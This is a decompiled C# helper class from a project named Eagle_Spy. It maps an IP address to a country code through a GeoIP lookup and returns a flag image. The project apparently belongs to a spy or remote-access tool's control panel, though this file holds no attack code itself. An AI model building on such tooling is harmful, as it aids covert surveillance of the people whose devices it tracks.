using System;
using System.Drawing;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000066 RID: 102
	[StandardModule]
	public sealed class GetFlagThisIp
	{
		// Token: 0x06000661 RID: 1633 RVA: 0x000AD940 File Offset: 0x000ABB40
		public static Image ThisIp(string ipc)
		{
			string text = Data.GeoIP0.LookupCountryCode(ipc.Trim()).ToUpper();
			int num = Array.IndexOf<string>(Data.GeoIP0.CountryCode, text);
			int num2 = Data.imageFlags.Images.IndexOfKey(text);
			int num3 = num;
			checked
			{
				if (num3 == -1)
				{
					num2 = -1;
				}
				else if (num3 == Data.GeoIP0.CountryName.Length)
				{
					num--;
					num2 = -1;
				}
				else if (num3 > Data.GeoIP0.CountryName.Length)
				{
					num2 = -1;
				}
				Image image;
				try
				{
					if (num2 == -1)
					{
						num2 = Data.imageFlags.Images.IndexOfKey("-1".ToUpper());
					}
					image = Data.imageFlags.Images[num2];
				}
				catch (Exception)
				{
					image = Data.imageFlags.Images[0];
				}
				return image;
			}
		}
	}
}
